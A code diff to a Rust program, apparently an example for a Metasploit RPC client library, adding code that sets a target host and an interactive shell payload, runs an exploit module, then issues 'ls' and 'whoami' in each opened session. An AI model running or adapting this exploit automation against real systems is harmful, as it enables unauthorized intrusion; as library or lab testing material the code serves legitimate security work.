@@ -4,6 +4,7 @@ extern crate msf_client;
 
 use msf_client::msg::ModuleOptionRet;
 use msf_client::MsfClient;
+use msf_client::MsfModule;
 
 
 fn main() {
@@ -85,6 +86,40 @@ fn main() {
                       return
                     },
     };
+
+    exp_mod.run_options.insert(String::from("RHOST"), String::from("172.17.0.3"));
+    exp_mod.run_options.insert(String::from("PAYLOAD"), String::from("cmd/unix/interact"));
+
+    match exp_mod.exploit() {
+        Ok(res) => println!("{:?}", res),
+        Err(err) => eprintln!("{}", err),
+    };
+
+    let mut sessions = client.sessions();
+
+    let sess_info = match sessions.list() {
+        Ok(res) => { println!("{:?}", res);
+                     res
+                   }
+        Err(err) => { eprintln!("{}", err);
+                      return
+                    }
+    };
+
+    for sid in sess_info.keys() {
+        let mut session = match sessions.session(sid) {
+            Ok(res) => res,
+            Err(err) => { eprintln!("{}", err);
+                          return
+                        }
+        };
+
+        println!("{}", session.write(String::from("ls\n")));
+        println!("{}", session.read());
+
+        println!("{}", session.write(String::from("whoami\n")));
+        println!("{}", session.read());
+    }
 
     return
 }
